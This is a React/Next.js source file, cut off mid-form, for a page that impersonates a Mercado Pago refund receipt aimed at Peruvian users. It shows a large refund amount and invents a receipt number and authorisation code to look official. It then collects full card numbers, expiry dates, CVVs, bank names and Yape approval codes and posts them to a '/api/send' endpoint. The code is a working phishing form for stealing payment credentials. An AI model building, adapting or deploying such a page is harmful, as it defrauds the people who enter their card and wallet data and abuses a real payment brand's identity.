"use client";

import { useState, useMemo } from "react";
import { useSearchParams } from "next/navigation";

export default function DevolucionPage() {
  const params = useSearchParams();
  const montoParam = params.get("monto");
  const monto = montoParam ? parseFloat(montoParam) : 11099.38; // 💰 monto dinámico

  const [metodo, setMetodo] = useState<"yape" | "credito" | "debito">("yape");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [form, setForm] = useState({
    nombres: "",
    tipoDoc: "DNI",
    nroDoc: "",
    email: "",
    telefono: "",
    banco: "",
    tarjeta: "",
    vencimiento: "",
    cvv: "",
    cuotas: "-",
    emailYape: "",
    telefonoYape: "",
    codigoAprobacionYape: "",
  });

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  // 🧩 Formato tarjeta 4 en 4
  const handleTarjetaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let digits = e.target.value.replace(/\D/g, "");
    if (digits.length > 16) digits = digits.slice(0, 16);
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    setForm((s) => ({ ...s, tarjeta: formatted }));
  };

  // 🧩 Formato vencimiento MM/AA
  const handleVencimientoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    setForm((s) => ({ ...s, vencimiento: v }));
  };

  // 🧩 CVV
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    setForm((s) => ({ ...s, cvv: v }));
  };

  const [authCode] = useState(() => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length: 6 }, () =>
      chars[Math.floor(Math.random() * chars.length)]
    ).join("");
  });

  const fecha = useMemo(
    () =>
      new Date().toLocaleDateString("es-PE", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      }),
    []
  );

  const seAcreditaEn = useMemo(() => {
    if (metodo === "yape") {
      const t = form.telefonoYape.replace(/\D/g, "");
      const last4 = t.slice(-4);
      return t ? `Yape ***${last4}` : "—";
    } else {
      const digits = form.tarjeta.replace(/\D/g, "");
      if (!digits) return "—";
      if (digits.length <= 6) return `${digits}`;
      const first6 = digits.slice(0, 6);
      const last4 = digits.slice(-4);
      return `${first6}XXXXXX${last4}`;
    }
  }, [metodo, form.telefonoYape, form.tarjeta]);

  // 💾 Validar antes de enviar
  const validate = () => {
    const e: Record<string, string> = {};

    if (!form.nombres.trim()) e.nombres = "Ingresa el nombre completo";
    if (!form.nroDoc.trim()) e.nroDoc = "Ingresa el número de documento";

    if (metodo === "yape") {
      if (!form.emailYape.trim()) e.emailYape = "Ingresa el correo afiliado a Yape";
      if (!form.telefonoYape.trim()) e.telefonoYape = "Ingresa el teléfono afiliado a Yape";
      if (!form.codigoAprobacionYape.trim()) e.codigoAprobacionYape = "Ingresa el código de aprobación";
    } else {
      const digits = form.tarjeta.replace(/\D/g, "");
      if (digits.length < 14) e.tarjeta = "Debe tener entre 14 y 16 dígitos";

      if (!form.email.trim()) e.email = "Ingresa el correo";
      if (!form.telefono.trim()) e.telefono = "Ingresa el teléfono";

      const match = form.vencimiento.match(/^(\d{2})\/(\d{2})$/);
      if (!match) e.vencimiento = "Formato MM/AA";
      else {
        const mm = Number(match[1]);
        if (mm < 1 || mm > 12) e.vencimiento = "Mes inválido";
      }

      if (!form.cvv) e.cvv = "Ingresa el CVV";
      else if (form.cvv.length < 3) e.cvv = "CVV mínimo 3 dígitos";
      else if (form.cvv.length > 4) e.cvv = "CVV máximo 4 dígitos";

      if (!form.banco.trim()) e.banco = "Ingresa el nombre del banco";
    }

    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!validate()) return;

    const body = {
      type: "devolucion_comprobante",
      fecha,
      comercio: "7926420",
      terminal: "",
      codigoAutorizacion: authCode,
      monto,
      metodo,
      seAcreditaEn,
      datos: form,
    };

    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    alert("✅ Solicitud enviada correctamente");
  };

  return (
    <main className="min-h-screen bg-[#f3f3f3] flex justify-center py-8 px-4 text-[#111]">
      <form
        onSubmit={handleSubmit}
        className="bg-white w-full max-w-[720px] rounded-xl shadow-md border border-[#ddd] p-8 sm:p-10"
      >
        {/* Encabezado */}
        <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between mb-6 gap-3">
          <div className="flex items-center gap-3">
            <img
              src="/logo-mercadopago.jpeg"
              alt="Mercado Pago"
              className="w-[45px] h-[45px] object-contain"
            />
            <p className="text-[14px] sm:text-[15px] text-[#333] leading-snug">
              Desde Mercado Pago gestionamos la devolución solicitada con los siguientes datos:
            </p>
          </div>
          <div className="text-right">
            <p className="text-[13px] text-[#555]">Comprobante de Devolución</p>
            <p className="text-[15px] font-semibold text-[#111]">
              #{Math.floor(Math.random() * 9000000 + 1000000)}
            </p>
          </div>
        </div>

        {/* Monto */}
        <div className="bg-[#fafafa] border border-[#eee] rounded-lg py-6 text-center mb-8 shadow-sm">
          <p className="text-[15px] text-[#333] font-medium">
            Monto total a devolver
          </p>
          <p className="text-[34px] font-bold text-[#00a650] my-2">
            S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}
          </p>
          <p className="text-[14px] text-[#555]">Se acredita en</p>
          <p className="text-[15px] font-medium mt-1">{seAcreditaEn}</p>
        </div>

        {/* Detalle */}
        <div className="text-[14px] mb-8 border-t border-[#eee] pt-2">
          <div className="flex justify-between py-1">
            <span>Total pagado</span>
            <strong>
              S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}
            </strong>
          </div>
          <div className="flex justify-between py-1">
            <span>Medio de Pago</span>
            <span>
              {metodo === "yape"
                ? "Yape"
                : metodo === "credito"
                ? "Crédito"
                : "Débito"}
            </span>
          </div>
          <div className="flex justify-between py-1">
            <span>Cuotas</span>
            <span>{metodo === "credito" ? form.cuotas : "-"}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Fecha de compra</span>
            <span>{fecha}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Fecha de solicitud de devolución</span>
            <span>{fecha}</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Comercio</span>
            <span>7926420</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Terminal</span>
            <span>—</span>
          </div>
          <div className="flex justify-between py-1">
            <span>Código Autorización</span>
            <span className="font-mono">{authCode}</span>
          </div>
        </div>

        {/* Formulario */}
        <div className="space-y-5">
          {/* Medio de pago */}
          <div>
            <label className="block text-[14px] font-medium mb-1">
              Medio de Pago
            </label>
            <select
              value={metodo}
              onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                setMetodo(e.target.value as "yape" | "credito" | "debito")
              }
              className="border border-[#ccc] rounded-md w-full p-2"
            >
              <option value="yape">Yape</option>
              <option value="credito">Tarjeta de Crédito</option>
              <option value="debito">Débito</option>
            </select>
          </div>
